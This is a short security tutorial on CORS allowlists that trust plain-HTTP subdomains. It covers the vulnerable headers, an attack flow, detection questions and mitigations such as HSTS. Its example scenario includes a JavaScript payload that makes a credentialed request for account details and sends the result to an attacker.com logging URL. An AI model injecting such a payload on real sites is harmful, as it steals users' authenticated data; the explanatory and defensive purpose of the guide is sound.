# Breaking TLS with Trusted HTTP Subdomains

## Overview

Some applications correctly use HTTPS but mistakenly trust HTTP subdomains in their CORS allowlist.

This weakens transport security and enables attackers to exploit unencrypted HTTP traffic.

---

# Vulnerable Configuration

Trusted Origin

```
http://trusted.example.com
```

Response

```http
Access-Control-Allow-Origin:
http://trusted.example.com

Access-Control-Allow-Credentials: true
```

Even though the main application uses HTTPS, the trusted origin communicates over HTTP.

---

# Why This Is Dangerous

HTTP traffic can be intercepted or modified by attackers on the network.

If an attacker controls or intercepts traffic to the trusted HTTP subdomain, they can execute JavaScript that performs authenticated CORS requests.

---

# Attack Flow

```
Victim

↓

Visits HTTP Resource

↓

Network Attacker

↓

Injects JavaScript

↓

Trusted HTTP Origin

↓

Credentialed CORS Request

↓

Sensitive Data Returned

↓

Attacker
```

---

# Example Scenario

```
https://app.example.com
```

trusts

```
http://stock.example.com
```

An attacker intercepts traffic to:

```
http://stock.example.com
```

and injects:

```javascript
fetch("https://app.example.com/accountDetails",{
credentials:"include"
})
.then(r=>r.text())
.then(d=>{
location="https://attacker.com/log?d="+encodeURIComponent(d);
});
```

The browser considers the request to originate from a trusted origin.

---

# Detection

Review the allowlist.

Questions:

- Are HTTP origins trusted?
- Are mixed protocols allowed?
- Are subdomains automatically trusted?
- Is HTTPS consistently enforced?

---

# Bug Bounty Perspective

Look for:

- HTTP subdomains
- Mixed-content resources
- Legacy applications
- Development environments
- Staging domains

These often contain weaker security controls.

---

# Mitigation

- Trust only HTTPS origins.
- Enforce HTTPS using HSTS.
- Remove HTTP origins from CORS allowlists.
- Regularly review trusted domains.

---

# Key Learnings

Trusting insecure HTTP origins undermines the security provided by HTTPS. A network attacker can leverage the trusted HTTP origin to access sensitive authenticated resources through CORS.